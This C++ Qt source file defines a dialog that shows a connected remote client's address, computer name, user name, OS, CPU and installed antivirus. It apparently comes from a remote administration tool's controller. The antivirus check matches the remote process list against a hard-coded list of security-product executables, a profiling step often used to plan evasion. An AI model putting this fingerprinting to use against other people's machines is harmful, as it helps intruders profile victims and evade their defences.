#include "ClientInformation.hpp"

namespace Window {
ClientInformation::ClientInformation(Network::Session *session_,
                                     QWidget *parent)
    : ui(new Ui::ClientInformation()), QDialog(parent), session(session_) {
  ui->setupUi(this);

  ui->table->setRowCount(IndexItem::max_item);
  ui->table->setColumnCount(1);
  ui->table->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);

  for (const auto &index : magic_enum::enum_values<IndexItem>()) {
    ui->table->setVerticalHeaderItem(index,
                                     new QTableWidgetItem(getIndexText(index)));
    ui->table->setItem(index, 0, new QTableWidgetItem(getData(index)));
  }

  ui->table->setHorizontalHeaderItem(0, new QTableWidgetItem(tr("Value")));
}

ClientInformation::~ClientInformation() { delete ui; }

QString ClientInformation::getIndexText(const IndexItem section) {
  QString text;

  switch (section) {
  case IndexItem::address:
    text = tr("Address");
    break;
  case IndexItem::computer_name:
    text = tr("Computer Name");
    break;
  case IndexItem::user_name:
    text = tr("User Name");
    break;
  case IndexItem::os_name:
    text = tr("OS Name");
    break;
  case IndexItem::cpu_model:
    text = tr("CPU Model");
    break;
  case IndexItem::anti_virus:
    text = tr("Anti Virus");
    break;
  case IndexItem::max_item:
    break;
  default:
    text = tr("Unknown Index");
    assert(false);
    break;
  }

  return text;
}

QString ClientInformation::getData(const IndexItem section) {
  QString text;

  switch (section) {
  case IndexItem::address:
    text = QString::fromStdString(session->getRemoteAddress());
    break;
  case IndexItem::computer_name:
    text = QString::fromStdString(session->getComputerName());
    break;
  case IndexItem::user_name:
    text = QString::fromStdString(session->getUserName());
    break;
  case IndexItem::os_name:
    text = QString::fromStdString(session->getOsName());
    break;
  case IndexItem::cpu_model:
    text = QString::fromStdString(session->getCpuModel());
    break;
  case IndexItem::anti_virus:
    text = getAntiVirus();
    break;
  case IndexItem::max_item:
    break;
  default:
    text = tr("Unknown Data");
    assert(false);
    break;
  }

  return text;
}

QString ClientInformation::getAntiVirus() {
  QString text;
  const auto &processes = session->getProcesses();

  for (const auto &p : processes) {
    auto upper_name = p.name;
    for (auto &c : upper_name) {
      c = std::toupper(c);
    }

    if (upper_name == "USYSDIAG.EXE")
      text += tr("Huorong, ");
    else if (upper_name == "360TRAY.EXE")
      text += tr("360 Safety, ");
    else if (upper_name == "360SD.EXE")
      text += tr("360 Anti Virus, ");
    else if (upper_name == "MSMPENG.EXE")
      text += tr("Windows Defender, ");
    else if (upper_name == "CCSVCHST.EXE")
      text += tr("Norton, ");
    else if (upper_name == "AVP.EXE")
      text += tr("Kaspersky, ");
    else if (upper_name == "KXETRAY.EXE")
      text += tr("Kingsoft, ");
    else if (upper_name == "AVCENTER.EXE")
      text += tr("Avira, ");
    else if (upper_name == "MCSHIELD.EXE")
      text += tr("McAfee, ");
    else if (upper_name == "QQPCRTP.EXE")
      text += tr("Tencent, ");
    else if (upper_name == "VSSERY.EXE")
      text += tr("BitDefender, ");
    else if (upper_name == "BAIDUSDSVC.EXE")
      text += tr("Baidu, ");
    else if (upper_name == "SPIDERNT.EXE")
      text += tr("Dr.Web, ");
    else if (upper_name == "ASHDISP.EXE")
      text += tr("Avast, ");
    else if (upper_name == "KVMONXP.EXE")
      text += tr("Jiangmin, ");
    else if (upper_name == "EGUI.EXE")
      text += tr("NOD32, ");
  }

  return text;
}
} // namespace Window
